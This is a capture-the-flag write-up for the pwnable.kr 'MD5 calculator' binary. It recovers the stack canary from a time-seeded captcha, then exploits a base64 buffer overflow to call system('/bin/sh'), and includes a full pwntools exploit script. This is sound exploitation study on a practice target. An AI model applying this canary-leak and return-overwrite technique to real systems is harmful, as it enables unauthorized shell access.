# Pwnable.kr MD5 calculator CTF Writeup

## Problem Description

The code of the program is:

### my_hash

```c
08048ed8  int32_t my_hash()

08048edf      void* gsbase
08048edf      int32_t eax = *(gsbase + 0x14)
08048eed      void var_30
08048eed      void* var_38 = &var_30
08048eed      
08048f1a      for (int32_t i = 0; i s<= 7; i += 1)
08048f10          *((i << 2) + var_38) = rand()
08048f10      
08048f75      int32_t result = *(var_38 + 0x14) + *(var_38 + 4) + *(var_38 + 8) - *(var_38 + 0xc) + *(var_38 + 0x20) + *(var_38 + 0x1c) + *(var_38 + 0x10) - *(var_38 + 0x18)
08048f75      
08048f85      if (eax == *(gsbase + 0x14))
08048f91          return result
08048f91      
08048f87      __stack_chk_fail()
08048f87      noreturn
```

### process_hash

```c
08048f92  int32_t process_hash()

08048f9d      void* gsbase
08048f9d      int32_t eax = *(gsbase + 0x14)
08048fbe      void s
08048fbe      __builtin_memset(&s, c: 0, n: 0x200)
08048fc9      int32_t i
08048fc9      
08048fc9      do
08048fc1          i = getchar()
08048fc9      while (i != 0xa)
08048fde      __builtin_memset(s: 0x804b0e0, c: 0, n: 0x400)
08048ff8      fgets(buf: &_0x804b0e0, n: 0x400, fp: stdin)
08049013      __builtin_memset(&s, c: 0, n: 0x200)
08049044      int32_t eax_3 = calc_md5(&s, Base64Decode(0x804b0e0, &s))
08049061      printf(format: "MD5(data) : %s\n", eax_3)
0804906f      free(mem: eax_3)
08049077      int32_t result = eax ^ *(gsbase + 0x14)
08049077      
0804907e      if (result == 0)
0804908e          return result
0804908e      
08049080      __stack_chk_fail()
08049080      noreturn
```

### main

```c
0804908f  int32_t main(int32_t argc, char** argv, char** envp)

080490b8      setvbuf(fp: stdout, buf: nullptr, mode: 1, size: 0)
080490dd      setvbuf(fp: stdin, buf: nullptr, mode: 1, size: 0)
080490e9      puts(str: "- Welcome to the free MD5 calcul…")
080490fd      srand(x: time(nullptr))
08049102      int32_t eax_1 = my_hash()
0804911b      printf(format: "Are you human? input captcha : %…", eax_1)
08049130      int32_t var_18
08049130      __isoc99_scanf(format: &data_80492df, &var_18)
08049130      
0804913d      if (eax_1 != var_18)
08049146          puts(str: "wrong captcha!")
08049152          exit(status: 0)
08049152          noreturn
08049152      
0804915e      puts(str: "Welcome! you are authenticated.")
0804916a      puts(str: "Encode your data with BASE64 the…")
0804916f      process_hash()
0804917b      puts(str: "Thank you for using our service.")
08049187      system(line: "echo `date` >> log")
08049192      return 0
```

## Analysis

The program first uses the `srand` function to seed the PRNG (pseudo-random number generator). The seed is the current time. This means that if we know the exact time the program ran, we can predict all the random values produced by `rand()`.

After that the program calls the `my_hash` function which generates a hash. It does this by creating an array of length 8 that contains random values (which we can predict). Then it calculates the hash like this:

```
result = vals[5] + vals[1] + vals[2] - vals[3] + vals[7] + vals[4] - vals[6] + var[8]
```

As we can see, there is a buffer overflow here because `var[8]` is outside the array. So the hash contains some 4-byte value from the stack, which we can calculate and find. To find what that value is, we need to look at the disassembly. There we can see the canary is set in these lines:

```asm
.text:08048EDF                 mov     eax, large gs:14h
.text:08048EE5                 mov     [ebp-0xc], eax
```

So the canary is located at `[ebp-0xc]`.

From the disassembly we also see:

```asm
mov [ebp-0xc], eax
lea eax, [ebp-0x2c]
mov [ebp-0x34], eax
```

So the array starts at `[ebp-0x2c]` (which is `[ebp-44]`) and its size is 8 entries, so its total size is 32 bytes. That means `arr[8]` is at address `[ebp-12]` (44 − 32 = 12), which in hex is `[ebp-0xc]`, and that's where the canary is saved.

Therefore the hash equals `vals[5] + vals[1] + vals[2] - vals[3] + vals[7] + vals[4] - vals[6] + canary`. Since we know all the random values, we can calculate the canary. All we need to do is run the exploit code locally (so `time()` returns the same value), create an array of 8 random numbers and calculate the hash without the canary. Then take the hash the program gives us and subtract the hash we calculated — the difference is the canary.

---

The second part of the exploit is in the `process_hash()` function. In this function there is another buffer overflow: on the stack there is an array of length `0x200` bytes (512 bytes), but the program allows us to write `0x400` (1024 bytes) to it. However, because of stack protection (the canary), we cannot overwrite the stack successfully unless we preserve the canary.

Fortunately, we already know the canary, so we simply need to overwrite the stack with our payload and write the original canary value back in its saved location. This way we can overwrite the return address and perform a ROP-style redirect.

To exploit this, overwrite the return address so it points to `0x8049187` (which is the `call system` address) instead of the address of `main`. We must also place an argument on the stack that points to the string `/bin/sh\0`. Since that string does not exist elsewhere in the program, write it into our buffer and calculate the address where it will reside.

In conclusion, the payload should look like this:

```
base64_encode(A * 512 + canary + [address of `call system`] + [address of "/bin/sh\0"]) + "/bin/sh\0"
```

(Note: the trailing `"/bin/sh\0"` should not be base64-encoded because we rely on the address in the `.bss` section and our input will appear there.)



## Exploit Code

```python
from pwn import *
import ctypes
import time

context.log_level = 'info'

libc = ctypes.CDLL("libc.so.6")
libc.srand.argtypes = (ctypes.c_uint,)
libc.rand.restype = ctypes.c_int

seed = int(time.time())
libc.srand(seed)

vals = [libc.rand() for _ in range(8)]

result = vals[5] + vals[1] + vals[2] - vals[3] + vals[7] + vals[4] - vals[6]
print("result:", result)

p = remote('localhost', 9002)

p.recvuntil(b'captcha : ')
captcha = int(p.recv().decode())
p.sendline(str(captcha))
print("captcha:", captcha)

canary = captcha - result
canary = canary & 0xffffffff
canary = p32(canary)
print("canary:", canary)

call_system_addr = p32(0x8049187)
print("call system address:", call_system_addr)

binsh_addr = p32(0x804B3AC)
print("/bin/sh address:", binsh_addr)

payload = b'A' * 512 + canary + b'A' * 12 + call_system_addr + binsh_addr
payload = b64e(payload).encode() + b'/bin/sh\0'

p.recvuntil(b'Encode your data with BASE64 then paste me!\n')
p.sendline(payload)
p.interactive()
```


